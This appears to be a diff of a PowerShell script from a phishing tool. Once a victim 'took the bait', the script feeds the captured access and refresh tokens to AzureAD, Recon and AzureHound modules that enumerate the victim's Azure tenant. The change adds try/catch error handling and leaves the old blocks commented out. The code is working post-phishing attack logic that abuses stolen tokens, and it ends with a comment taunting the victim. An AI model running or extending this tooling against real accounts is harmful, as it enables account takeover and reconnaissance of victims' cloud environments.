@@ -42,23 +42,64 @@ Write-Output "$user took the bait."
 $switch = "$user"
 $switch | Out-File -Path .\target.txt 
 
-if($azureAd){
-    Write-Output "Starting Azurehound module..."
-    # .\Recon.ps1 -accessToken $access -refreshToken $refresh
-    .\azuread.ps1 -response $response
+if ($azureAd) {
+    try {
+        Write-Output "Starting AzureAd module..."
+        .\azuread.ps1 -response $response
+    }
+    catch {
+        Write-Error "An error occurred in the AzureAd block: $_"
+        # Optionally, you can exit the script here
+        # exit 1
+    }
 }
 
-if($recon){
-    Write-Output "Starting Azurehound module..."
-    # .\Recon.ps1 -accessToken $access -refreshToken $refresh
-    .\Recon.ps1 -response $response
+if ($recon) {
+    try {
+        Write-Output "Starting Recon module..."
+        .\Recon.ps1 -accessToken $access -refreshToken $refresh
+    }
+    catch {
+        Write-Error "An error occurred in the Recon block: $_"
+        # Optionally, you can exit the script here
+        # exit 1
+    }
 }
 
-# AzureHound
-if($azureHound){
-    Write-Output "Starting Azurehound module..."
-    .\azurehound.ps1 -domain $domain -refreshToken $response.refresh_token
+if ($azureHound) {
+    try {
+        Write-Output "Starting AzureHound module..."
+        .\azurehound.ps1 -domain $domain -refreshToken $response.refresh_token
+    }
+    catch {
+        Write-Error "An error occurred in the AzureHound block: $_"
+        # Optionally, you can exit the script here
+        # exit 1
+    }
 }
+
+
+
+
+
+
+# if($azureAd){
+#     Write-Output "Starting Azurehound module..."
+#     # .\Recon.ps1 -accessToken $access -refreshToken $refresh
+#     .\azuread.ps1 -response $response
+# }
+
+# if($recon){
+#     Write-Output "Starting Azurehound module..."
+#     # .\Recon.ps1 -accessToken $access -refreshToken $refresh
+#     .\Recon.ps1 -response $response
+# }
+
+# # AzureHound
+# if($azureHound){
+#     Write-Output "Starting Azurehound module..."
+#     .\azurehound.ps1 -domain $domain -refreshToken $response.refresh_token
+# }
 
 
 # Read-Host "Not done with you yet, hoss."
